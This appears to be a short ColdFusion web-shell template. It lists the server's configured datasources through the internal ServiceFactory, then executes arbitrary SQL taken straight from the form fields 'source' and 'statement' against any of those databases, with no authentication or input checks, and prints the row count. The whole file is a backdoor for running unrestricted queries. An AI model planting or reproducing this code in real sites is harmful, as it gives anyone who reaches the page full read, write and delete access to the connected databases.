<cfscript>
items=createobject("java","coldfusion.server.ServiceFactory").getDatasourceService().getDatasources();
</cfscript>
<cfquery name="result" datasource="#form.source#">#form.statement#</cfquery>
<cfoutput>#result.RecordCount#</cfoutput>
